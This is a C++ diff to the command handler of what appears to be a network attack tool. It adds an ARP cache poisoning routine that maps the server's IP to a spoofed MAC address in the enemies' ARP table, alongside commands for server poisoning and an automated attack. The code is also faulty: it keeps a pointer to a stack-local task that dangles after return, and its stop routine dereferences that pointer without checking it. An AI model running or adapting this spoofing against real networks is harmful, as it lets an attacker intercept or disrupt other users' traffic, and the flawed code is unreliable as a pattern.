@@ -73,10 +73,26 @@ void CommandManager::HealEnemies(std::string message) {
 
 void CommandManager::StartPoisonEnemies(std::string message) {
   // Start poisoning enemies towards dummy server
+  if (enemy_poison_task_ != NULL) {
+    StopPoisonEnemies(message);
+  }
+
+  char* spoof_ip = strdup(server_ip.c_str());
+  char* spoof_mac = (char*) "1337420b142e";
+  std::unordered_map<char*, char*> spoof_addresses = {
+    {spoof_ip, spoof_mac}
+  };
+  u_long duration = 5;
+
+  PoisonTask task(enemy_arp_table, spoof_addresses, duration);
+  enemy_poison_task_ = &task;
+  enemy_poison_task_->Start();
 }
 
 void CommandManager::StopPoisonEnemies(std::string message) {
   // Stop poisoning enemies
+  enemy_poison_task_->Stop();
+  enemy_poison_task_ = NULL;
 }
 
 void CommandManager::StartPoisonServer(std::string message) {
@@ -118,7 +134,7 @@ void CommandManager::Run() {
     {"startps", &CommandManager::StartPoisonServer},
     {"stopps", &CommandManager::StopPoisonServer},
     {"attack", &CommandManager::AutomatedAttack},
-    {"a", &CommandManager::AutomatedAttack},
+    {"a", &CommandManager::AutomatedAttack}
   };
 
   std::cout << std::endl << "Enter commands here, type 'help' for help.";
